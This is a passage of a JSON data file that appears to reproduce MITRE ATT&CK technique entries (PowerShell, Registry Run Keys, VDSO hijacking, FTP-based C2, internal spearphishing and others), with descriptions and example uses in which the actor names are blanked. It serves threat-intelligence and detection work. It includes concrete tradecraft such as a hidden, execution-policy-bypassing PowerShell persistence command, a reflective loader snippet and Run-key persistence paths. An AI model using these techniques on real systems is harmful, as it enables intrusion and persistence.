      "has used PowerShell to gain access to merchant's networks and a Metasploit PowerShell module to download and execute shellcode and to set up a local listener.",
      "has been written in PowerShell and executed directly in memory avoiding detection.",
      "has used PowerShell scripts.",
      "has used PowerShell-based tools and scripts for discovery and collection on compromised hosts.",
      "has used PowerShell scripts to execute malicious code.",
      "can use PowerShell scripts for execution.",
      "has used the Exchange Power Shell module Set-OabVirtualDirectoryPowerShell to export mailbox data.",
      "is known to use PowerShell.",
      "has used PowerShell to drop and execute malware loaders.",
      "uses PowerShell for execution as well as PowerShell Empire to establish persistence.",
      "can use PowerShell to pull Active Directory information from the target environment.",
      "has the ability to use PowerShell scripts to execute commands.",
      "has used a PowerShell script to install a shim database.",
      "can use PowerShell for payload execution on targeted systems.",
      "used PowerShell to download additional payloads and for execution.",
      "has a version written in PowerShell.",
      "has used PowerShell to execute commands/scripts in some cases via a custom executable or code from 's PSInject.  has also used PowerShell scripts to load and execute malware in memory.",
      "can use Powershell for execution including the cmdlets `Invoke-WebRequest` and `Invoke-Expression`.",
      "has used PowerShell to download and execute payloads.",
      "uses the PowerShell command Reflection.Assembly to load itself into memory to aid in execution.",
      "has attempted to execute with PowerShell.",
      "used PowerShell implants on target machines.",
      "has used PowerShell loaders as part of execution.",
      "has used Powershell scripts to perform post exploit collection.",
      "In the   used a publicly available PowerShell-based tool WMImplant.",
      "is written in PowerShell.",
      "During the  campaign  used PowerShell to perform timestomping.",
      "uses PowerShell commands to download and execute payloads.",
      "has used PowerShell on victim systems to download and run payloads after exploitation.",
      "can use PowerShell for execution including the cmdlets `Invoke-WebRequst` and `Invoke-Expression`.",
      "has used PowerShell to load itself every time a user logs in to the system.  can execute PowerShell scripts loaded into memory or from the file system.",
      "can generate shellcode outputs that execute via PowerShell.",
      "can execute PowerShell scripts.",
      "used PowerShell to create shellcode loaders.",
      "is written in and executed via PowerShell without using powershell.exe.",
      "has used PowerShell for execution of a payload.",
      "has used obfuscated PowerShell scripts for staging.",
      "has executed a variety of PowerShell scripts.",
      "During  threat actors used PowerShell on compromised systems.",
      "has used PowerShell commands to download additional files.",
      "During  the threat actors used obfuscated PowerShell to extract an encoded payload from within an .LNK file.",
      "has used PowerShell to download and execute malware and reconnaissance scripts.",
      "has used PowerShell commands embedded inside batch scripts.",
      "has the ability to execute PowerShell scripts.",
      "malicious spearphishing payloads are executed as .  has also used  for lateral movement and credential access.",
      "has utilized PowerShell to download files from the C2 server and run various scripts.",
      "can execute PowerShell commands on the victim's machine.",
      "has used PowerShell for execution.",
      "has used malicious PowerShell scripts to enable execution.",
      "uses PowerShell scripts for execution.",
      "can execute Powershell commands sent from its C2 server.",
      "can use PowerShell for execution.",
      "used  to download payloads run a reverse shell and execute malware on the victim's machine.",
      "has used PowerShell to download additional payloads.",
      "can execute PowerShell commands via WMI.",
      "has used PowerShell to execute commands and other operational tasks.",
      "leveraged PowerShell to download and execute additional scripts for execution.",
      "has staged and executed PowerShell scripts on compromised hosts.",
      "The  dropper can use PowerShell to download the malware.",
      "uses  to inject shellcode into PowerShell.",
      "has used PowerShell to download additional modules.",
      "The 's Information Gathering Tool (IGT) includes PowerShell components.",
      "malware uses PowerShell commands to perform various functions including gathering system information via WMI and executing commands from its C2 server.",
      "has used PowerShell to execute its payload.",
      "uses PowerShell for execution.",
      "downloads a PowerShell script that decodes to a typical shellcode loader.",
      "uses a command prompt to run a PowerShell script from Excel. To assist in establishing persistence  creates %APPDATA%\\OneDrive.bat and saves the following string to it:powershell.exe -WindowStyle Hidden -exec bypass -File %APPDATA%\\OneDrive.ps1.",
      "uses a module to execute Mimikatz with PowerShell to perform .",
      "modules are written in and executed via .",
      "has used PowerShell for execution.",
      "has used PowerShell scripts to access credential data.",
      "has used PowerShell to communicate with C2 download files and execute reconnaissance commands.",
      "There is a variant of  that uses a PowerShell script instead of the traditional PE form.",
      "has used an encoded PowerShell command by a service created by  for lateral movement.",
      "uses PowerShell scripts.",
      "is written and executed via PowerShell.",
      "has the ability to execute PowerShell commands on a compromised machine.",
      "has used PowerShell scripts for execution.",
      "has used PowerShell to execute the Meterpreter downloader TinyMet.",
      "has downloaded additional scripts and executed Base64 encoded commands in PowerShell.",
      "can use a PowerShell script for second-stage execution.",
      "is written in PowerShell.",
      "has used PowerShell to create a Meterpreter session.",
      "has used PowerShell to execute malicious files and payloads.",
      "has used PowerShell for execution.",
      "has the ability to download and execute PowerShell scripts.",
      "has the ability to run shell commands via PowerShell.",
      "can use an obfuscated PowerShell command to create a scheduled task for persistence.",
      "can create PowerShell-based launchers for Grunt installation.",
      "has used Base64-encoded PowerShell scripts to disable Microsoft Defender.",
      "has used PowerShell to execute commands and to download malware.",
      "can use an encoded PowerShell stager to write to the Registry for persistence.",
      "relies extensively on PowerShell execution from malicious attachments and related content to retrieve and execute follow-on payloads.",
      "can invoke the PowerShell command       `[Reflection.Assembly]::LoadFile(\\%s\\)\\n$i=\\\\\\n$r=[%s]::%s(\\%s\\[ref] $i)\\necho $r$i\\n` to execute secondary payloads.",
      "can run arbitrary PowerShell commands passed to it.",
      "has used PowerShell commands to gather information from compromised systems such as email servers.",
      "used PowerShell to download and execute remote-hosted files on victim systems.",
      "can use a malicious PowerShell script to bypass Windows controls.",
      "has executed a variety of PowerShell scripts including Invoke-Mimikatz.",
      "During  threat actors used PowerShell cmdlets New-MailboxSearch and Get-Recipient for discovery.",
      "passed execution from obfuscated JavaScript files to PowerShell scripts to download and install .",
      "has leveraged PowerShell scripts for initial process execution and data gathering in victim environments.",
      "passed execution from document macros to PowerShell scripts during initial access operations.  used batch scripts that called PowerShell commands as part of initial access and installation operations.",
      "can use PowerShell to delete volume shadow copies.",
      "has downloaded and executed PowerShell payloads.",
      "used LNK files to execute PowerShell commands leading to eventual  installation during .",
      "can use PowerShell to apply Group Policy changes.",
      "During   used PowerShell cmdlet Get-ChildItem to access credentials among other PowerShell functions deployed.",
      "has used PowerShell to collect system information and to upload the collected data to a Github repository.",
      "has used PowerShell for multiple purposes such as using PowerShell scripts executing in an infinite loop to create an SSH connection to a command and control server.",
      "creates and executes a PowerShell script to delete itself.",
      "uses PowerShell to disable protectors used to secure the BitLocker encryption key on victim machines and then delete the key from the system.",
      "variants have used PowerShell scripts to download or drop payloads including obfuscated variants to connect to a WebDAV server to download and executed an encrypted DLL for installation.",
      "has built-in functionality to launch a Powershell command prompt.",
      "has used PowerShell to create a remote shell.",
      "During   used a PowerShell script to steal credentials.",
      "has used PowerShell scripts for credential harvesting and privilege escalation.",
      "used encoded PowerShell commands during operations.  has used remote PowerShell commands in victim networks.",
      "has used PowerShell for initial user execution and other fuctions.",
      "can use the PowerShell module `InvokeGPUpdate` to modify Group Policy.",
      "has used PowerShell to download and run additional content.",
      "can use PowerShell to execute commands received from C2."
    ],
    "description": "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)PowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)",
    "similar_words": [
      "PowerShell"
    ],
    "id": "T1059.001"
  },
  "attack-pattern--98034fef-d9fb-4667-8dc4-2eab6231724c": {
    "name": "Change Default File Association",
    "example_uses": [
      "can conduct an image hijack of an `.msc` file extension as part of its UAC bypass process.",
      "has a HWP document stealer module which changes the default program association in the registry to open HWP documents."
    ],
    "description": "Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility.(Citation: Microsoft Change Default Programs)(Citation: Microsoft File Handlers)(Citation: Microsoft Assoc Oct 2017) Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.System file associations are listed under HKEY_CLASSES_ROOT\\.[extension], for example HKEY_CLASSES_ROOT\\.txt. The entries point to a handler for that extension located at HKEY_CLASSES_ROOT\\\\[handler]. The various commands are then listed as subkeys underneath the shell key at HKEY_CLASSES_ROOT\\\\[handler]\\shell\\\\[action]\\command. For example: * HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command* HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command* HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\commandThe values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands.(Citation: TrendMicro TROJ-FAKEAV OCT 2012)",
    "similar_words": [
      "Change Default File Association"
    ],
    "id": "T1546.001"
  },
  "attack-pattern--98be40f2-c86b-4ade-b6fc-4964932040e5": {
    "name": "VDSO Hijacking",
    "example_uses": [],
    "description": "Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process. VDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via [Ptrace System Calls](https://attack.mitre.org/techniques/T1055/008). However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).(Citation: ELF Injection May 2009)(Citation: Backtrace VDSO)(Citation: VDSO Aug 2005)(Citation: Syscall 2014)Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.  ",
    "similar_words": [
      "VDSO Hijacking"
    ],
    "id": "T1055.014"
  },
  "attack-pattern--9a60a291-8960-4387-8a4a-2ab5c18bb50b": {
    "name": "File Transfer Protocols",
    "example_uses": [
      "has used FTP for C2 communications.",
      "used exploit payloads that initiate download via .",
      "supports SMB-based peer-to-peer C2 profiles.",
      "has the ability to use FTP in C2 communications.",
      "The  malware platform supports many standard protocols including SMB.",
      "uses FTP for Command & Control.",
      "contains the ftpUpload function to use the FTPManager:uploadFile method to upload files from the target system.",
      "can communicate over FTP.",
      "uses FTP and FTPS to communicate with the C2 server.",
      "has used FTP protocol for C2 communication.",
      "has the ability to transfer data between SMB shares.",
      "During  the threat actors had the ability to use FTP for C2.",
      "has used FTP for C2 connections.",
      "has used FTP for C2 communications.",
      "has used SMB for C2.",
      "has the ability to use FTP in C2 communications.",
      "uses FTP for C2 communications.",
      "can emulate an FTP server to connect to actor-controlled C2 servers.",
      "can conduct peer-to-peer communication over Windows named pipes encapsulated in the SMB protocol. All protocols use their standard assigned ports.",
      "can use SMB to transfer files.",
      "has used FTP to download additional malware to the target machine.",
      "has used FTP for C2 communications."
    ],
    "description": "Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Protocols such as SMB(Citation: US-CERT TA18-074A), FTP(Citation: ESET Machete July 2019), FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",
    "similar_words": [
      "File Transfer Protocols"
    ],
    "id": "T1071.002"
  },
  "attack-pattern--9c45eaa3-8604-4780-8988-b5074dbb9ecd": {
    "name": "Emond",
    "example_uses": [],
    "description": "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at /sbin/emond will load any rules from the /etc/emond.d/rules/ directory and take action once an explicitly defined event takes place.The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path /private/var/db/emondClients, specified in the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) configuration file at/System/Library/LaunchDaemons/com.apple.emond.plist.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019)Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) service.",
    "similar_words": [
      "Emond"
    ],
    "id": "T1546.014"
  },
  "attack-pattern--9c99724c-a483-4d60-ad9d-7f004e42e8e8": {
    "name": "One-Way Communication",
    "example_uses": [
      "has used a one-way communication method via GitLab and Digital Point to perform C2.",
      "has received C2 instructions from user profiles created on legitimate websites such as Github and TechNet.",
      "has downloaded a zip file for execution on the system.",
      "uses Twitter as a backup C2.",
      "The tDiscoverer variant of  establishes a C2 channel by downloading resources from Web services like Twitter and GitHub.  binaries contain an algorithm that generates a different Twitter handle for the malware to check for instructions every day.",
      "has used Telegram Messenger content to discover the IP address for C2 communications.",
      "utilized HTTP command and control traffic where commands are intercepted from HTTP traffic to the device parsed for appropriate identifiers and commands and then executed.",
      "has used web services such as Twitter for command and control purposes.",
      "parses encoded commands from error logs after attempting to resolve a non-existing webpage from the command and control server."
    ],
    "description": "Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
    "similar_words": [
      "One-Way Communication"
    ],
    "id": "T1102.003"
  },
  "attack-pattern--9d48cab2-7929-4812-ad22-f536665f0109": {
    "name": "Gather Victim Network Information",
    "example_uses": [
      "gathered the fully qualified domain names (FQDNs) for targeted Exchange servers in the victim's environment.",
      "has conducted extensive pre-compromise reconnaissance to learn about the target organizations network.",
      "has downloaded tools such as the Advanced Port Scanner utility and Lansweeper to conduct internal reconnaissance of the victim network.  has also accessed the victims VMware VCenter which had information about host configuration clusters etc."
    ],
    "description": "Adversaries may gather information about the victim's networks that can be used during targeting. Information about networks may include a variety of details, including administrative data (ex: IP ranges, domain names, etc.) as well as specifics regarding its topology and operations.Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about networks may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
    "similar_words": [
      "Gather Victim Network Information"
    ],
    "id": "T1590"
  },
  "attack-pattern--9e7452df-5144-4b6e-b04a-b66dd4016747": {
    "name": "Internal Spearphishing",
    "example_uses": [
      "has used an Outlook VBA module on infected systems to send phishing emails with malicious attachments to other employees within the organization.",
      "has sent internal spearphishing emails for lateral movement after stealing victim information.",
      "During   conducted internal spearphishing from within a compromised organization.",
      "has conducted internal spearphishing within the victim's environment for lateral movement.",
      "has conducted internal spearphishing attacks against executives HR and IT personnel to gain information and access."
    ],
    "description": "After they already have access to accounts or systems within the environment, adversaries may use internal spearphishing to gain access to additional information or compromise other users within the same organization. Internal spearphishing is multi-staged campaign where a legitimate account is initially compromised either by controlling the user's device or by compromising the account credentials of the user. Adversaries may then attempt to take advantage of the trusted internal account to increase the likelihood of tricking more victims into falling for phish attempts, often incorporating [Impersonation](https://attack.mitre.org/techniques/T1656).(Citation: Trend Micro - Int SP)For example, adversaries may leverage [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) or [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through [Input Capture](https://attack.mitre.org/techniques/T1056) on sites that mimic login interfaces.Adversaries may also leverage internal chat apps, such as Microsoft Teams, to spread malicious content or engage users in attempts to capture sensitive information and/or credentials.(Citation: Int SP - chat apps)",
    "similar_words": [
      "Internal Spearphishing"
    ],
    "id": "T1534"
  },
  "attack-pattern--9e8b28c9-35fe-48ac-a14d-e6cc032dcbcd": {
    "name": "Services File Permissions Weakness",
    "example_uses": [
      "One variant of  locates existing driver services that have been disabled and drops its driver component into one of those service's paths replacing the legitimate executable. The malware then sets the hijacked service to start automatically to establish persistence."
    ],
    "description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",
    "similar_words": [
      "Services File Permissions Weakness"
    ],
    "id": "T1574.010"
  },
  "attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279": {
    "name": "Registry Run Keys / Startup Folder",
    "example_uses": [
      "Variants of  have added Run Registry keys to establish persistence.",
      "establishes persistence via a Registry Run key.",
      "has created Registry keys for persistence in [HKLM|HKCU]\\\\CurrentVersion\\Run.",
      "An  HTTP malware variant establishes persistence by setting the Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows Debug Tools-%LOCALAPPDATA%\\.",
      "has added persistence via the Registry key HKCU\\Software\\Microsoft\\CurrentVersion\\Run\\.",
      "has maintained persistence using the startup folder.",
      "creates a Registry start-up entry to establish persistence.",
      "has placed VBS files in the Startup folder and used Registry run keys to establish persistence for malicious payloads.",
      "has used Registry Run keys to establish automatic execution at system startup.",
      "adds Registry Run keys to achieve persistence.",
      "achieves persistence by creating a shortcut in the Startup folder.",
      "has used Registry run keys to establish persistence for the  Trojan and other tools such as a modified version of TeamViewer remote desktop software.",
      "malware has used Registry Run keys to establish persistence.",
      "can use a Registry Run Key and the Startup folder to establish persistence.",
      "can add itself to the Registry as a startup program to establish persistence.",
      "can place malicious executables in a victim's AutoRun registry key or StartUp directory depending on the AV product installed to maintain persistence.",
      "persists by creating a Registry entry in HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\.",
      "establishes persistence by creating the Registry key HKCU\\Software\\Microsoft\\Windows\\Run.",
      "can add itself to the `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` and `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UIF2IS20VK` Registry keys.",
      "has created a file named startup_vrun.bat in the Startup folder of a virtual machine to establish persistence.",
      "creates a Registry Run key to establish persistence.",
      "establishes a foothold by adding a link to the malware executable in the startup folder.",
      "has maintained persistence by modifying Registry run key value  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\.",
      "During   placed LNK files into the victims' startup folder for persistence.",
      "has deployed malware that has copied itself to the startup directory for persistence.",
      "has added batch scripts to the startup folder.",
      "can add itself to the Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence.",
      "adds a sub-key under several Registry run keys.",
      "can achieve persistence through the Registry Run key.",
      "has created payloads in the Startup directory to maintain persistence.",
      "creates an autostart Registry key to ensure persistence.",
      "creates run key Registry entries pointing to a malicious executable dropped to disk.",
      "has maintained persistence by placing itself inside the current user's startup folder.",
      "can persist by setting Registry key values HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\QQMusic and HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\QQMusic.",
      "can set persistence with a Registry run key.",
      "has established persistence by setting the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key value for wdm to the path of the executable. It has also used the Registry entry HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run vpdn %ALLUSERPROFILE%\\%APPDATA%\\vpdn\\VPDN_LU.exe to establish persistence.",
      "can be loaded into the Startup folder (`%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDrives.lnk`) as a Shortcut file for persistence.",
      "achieves persistence by adding itself to the HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Registry key.",
      "has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor.",
      "establishes persistence by creating a shortcut in the Start Menu folder.",
      "has modified a victim's Windows Run registry to establish persistence.",
      "has established persistence via the `Software\\Microsoft\\Windows NT\\CurrentVersion\\Run` registry key and by creating a .lnk shortcut file in the Windows startup folder.",
      "can maintain persistence by creating an auto-run Registry key.",
      "has used HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run and the Startup folder to establish persistence.",
      "can set persistence with a Registry run key.",
      "establishes persistence by adding a Registry Run key.",
      "can establish persistence by creating a .lnk file in the Start menu.",
      "malware can create a .lnk file and add a Registry Run key to establish persistence.",
      "can add Registry run keys for persistence.",
      "has been observed adding the downloaded payload to the HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key to maintain persistence.",
      "One persistence mechanism used by  is to set itself to be executed at system startup by adding a Registry value under one of the following Registry keys: <br>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ <br>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ <br>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run <br>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run",
      "can create a Startup item for persistence if it determines it is on a Windows system.",
      "can place a lnk file in the Startup Folder to achieve persistence.",
      "added Registry Run keys to establish persistence.",
      "has the ability to create persistence for the malware using the Registry autorun key and startup folder.",
      "can establish persistence by adding a Registry run key.",
      "tries to add a Registry Run key under the name Windows Update to establish persistence.",
      "Most  samples maintain persistence by setting the Registry Run key SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ in the HKLM or HKCU hive with the Registry value and file name varying by sample.",
      "has created a Registry Run key named Dropbox Update Setup to establish persistence for a malicious Python binary.",
      "creates a shortcut file and saves it in a Startup folder to establish persistence.",
      "If the  client process does not have administrator privileges it will add a registry key to `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` for persistence.",
      "achieves persistence by making an entry in the Registry's Run key.",
      "has modified the Registry key HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute from autocheck autochk * to autocheck autoche * in order to execute its payload during Windows startup.",
      "has added the path of its second-stage malware to the startup folder to achieve persistence. One of its file stealers has also persisted by adding a Registry Run key.",
      "can establish persistence by installing itself in the startup folder whereas the GO variant has created a `HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\OutlookM` registry key.",
      "has established persistence via the `HKCU\\SOFTWARE\\microsoft\\windows\\currentversion\\run` registry key.",
      "copies itself to the Startup folder to establish persistence.",
      "can drop its payload into the Startup directory to ensure it automatically runs when the compromised system is started.",
      "can establish persistence by adding Registry Run keys.",
      "installation includes AutoIt script execution creating a shortcut to itself as an LNK object such as bill.lnk in the victim startup folder.  installation finishes with the creation of a registry Run key.",
      "A version of  has dropped a Windows shortcut into the Startup folder to establish persistence.",
      "copies itself to disk and creates an associated run key Registry entry to establish.",
      "can gain persistence by a creating a shortcut in the infected user's Startup directory.",
      "can achieve persistence by adding itself to the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run Registry key.",
      "has been loaded through DLL side-loading of a legitimate Citrix executable that is set to persist through the Registry Run key location HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ssonsvr.exe.",
      "has used Registry Run keys to establish persistence for its downloader tools known as HARDTACK and SHIPBREAD.",
      "has configured persistence to the Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run Spotify =% APPDATA%\\Spotify\\Spotify.exe and used .LNK files in the startup folder to achieve persistence.",
      "has been executed via the `RunOnce` Registry key to run itself on safe mode.",
      "can create a VBS file in startup to persist after system restarts.",
      "creates a Registry Run key to establish persistence.",
      "A  Javascript backdoor added a local_update_check value under the Registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run to establish persistence. Additionally a  custom executable containing Metasploit shellcode is saved to the Startup folder to gain persistence.",
      "adds a Registry Run key for persistence and adds a script in the Startup folder to deploy the payload.",
      "has the ability to add itself to the Registry Run key for persistence.",
      "has created a new registry entry at HKEY_CURRENT_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Graphics with a value of C:\\ProgramData\\Initech\\Initech.exe /run.",
      "can achieve persistence through a Registry Run key.",
      "has established persistence by writing the payload to the Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.",
      "can use run keys and create link files in the startup folder for persistence.",
      "A dropper used by  installs itself into the ASEP Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run with a value named McUpdate.",
      "has been observed using a Registry Run key.",
      "has added Registry Run key KCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemTextEncoding to establish persistence.",
      "adds a Registry Run key to establish persistence.",
      "has added Registry Run keys to establish persistence.",
      "can create a link to itself in the Startup folder to automatically start itself upon system restart.",
      "creates the following Registry entry: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Micromedia.",
      "registers itself under a Registry Run key with the name USB Disk Security.",
      "can add a service named wind0ws to the Registry to achieve persistence after reboot.",
      "has used a Registry Run key to establish persistence by executing JavaScript code within the rundll32.exe process.",
      "can achieve persitence on the infected machine by setting the Registry run key.",
      "has added paths to executables in the Registry to establish persistence.",
      "has set the run key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence.",
      "has used HKLM\\SOFTWARE\\Microsoft\\CurrentVersion\\Run to establish persistence.",
      "can create persistence by adding a shortcut in the CurrentVersion\\Run Registry key.",
      "The SCOUT variant of  achieves persistence by adding itself to the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Registry key.",
      "may attempt to establish persistence via the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ run key.",
      "has installed a registry based start-up key HKCU\\Software\\microsoft\\windows\\CurrentVersion\\Run to maintain persistence should other methods fail.",
      "malware can add a Registry key to `Software\\Microsoft\\Windows\\CurrentVersion\\Run` for persistence.",
      "utilizes Run Registry keys in the HKLM hive as a persistence mechanism.",
      "achieves persistence by creating a shortcut in the current user's Startup folder.",
      "has created shortcuts in the Startup folder to establish persistence.",
      "has maintained persistence by loading malicious code into a startup folder or by adding a Registry Run key.",
      "created and modified startup files for persistence.  added a registry key in HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost to establish persistence for Cobalt Strike.",
      "has created LNK files in the Startup folder to establish persistence.",
      "creates a link in the startup folder for persistence.  adds persistence via the registry key `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`.",
      "can modify the registry run keys HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run and HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence.",
      "has established persistence via the `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` registry key and by loading a dropper to `(%COMMON_ STARTUP%\\\\eoffice.exe)`.",
      "has the ability to add itself to `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OutlookMicrosift` for persistence.",
      "has used reg.exe to create a Registry Run key.",
      "has the ability to add a value to the Registry Run key to establish persistence if it detects it is running with regular user privilege.",
      "malware has created Registry Run and RunOnce keys to establish persistence and has also added items to the Startup folder.",
      "version of  adds a registry key to HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence.",
      "establishes persistence in the Startup folder.",
      "installs itself under Registry Run key to establish persistence.",
      "has established persistence by using the Registry option in PowerShell Empire to add a Run key.",
      "has established persistence via the Startup folder or Run Registry key.",
      "has used Registry run keys to establish persistence.",
      "sets up persistence with a Registry run key.",
      "can establish persistence by adding Registry Run keys.",
      "creates run key Registry entries pointing to malicious DLLs dropped to disk.",
